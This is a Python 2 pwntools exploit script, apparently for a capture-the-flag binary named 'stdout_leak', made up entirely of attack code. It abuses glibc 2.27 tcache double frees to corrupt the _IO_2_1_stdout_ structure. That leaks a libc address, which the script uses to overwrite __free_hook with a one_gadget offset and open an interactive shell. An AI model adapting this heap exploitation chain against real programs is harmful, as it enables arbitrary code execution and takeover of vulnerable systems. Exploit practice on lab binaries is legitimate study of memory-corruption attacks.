# stdout_leak.py 
from pwn import *
p = process("./stdout_leak")
def add(size,data):
	print p.sendlineafter(">","1")
	print p.sendlineafter(":",str(size))
	print p.sendafter(":",str(data))
def free(idx):
	print p.sendlineafter(">","2")
	print p.sendlineafter(":",str(idx))
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
stdout = libc.symbols['_IO_2_1_stdout_']
print hex(stdout) 
add(0x30, "A") # 0
add(0x40, "B") # 1
add(0x410,"A") # 2
add(0x10,"A")  # 3
# unsorted bin
free(2)
# tcache dup 0x50 bin
free(1)
free(1)
#tcache dup 0x40 bin
free(0)
free(0)
# # # pointing unsorted bin 
add(0x30, "\xf0")  # 4
add(0x30, "A")  # 5
# # bruteforce stdout
add(0x30, "\x60\x17") # 6
add(0x40, "\xf0") # 7
add(0x40, "A") # 8
add(0x40, "A") #9
add(0x40, p64(0xfbad38c0) + p64(0)*3 + "\x20") # leak # 10
p.recv(1)
libc_leak = u64(p.recv(6).ljust(8,"\x00"))
libc_base = libc_leak - 0x3eb780
free_hook = libc_base + libc.symbols['__free_hook']
oneshot = libc_base + 0x4f322
print hex(libc_leak)
print hex(libc_base)
# free_hook overwrite using tcache dup
add(0x70,"A") # 11
free(11)
free(11)
add(0x70, p64(free_hook))
add(0x70, "A")
add(0x70, p64(oneshot))
# get shell
free(0)
p.interactive()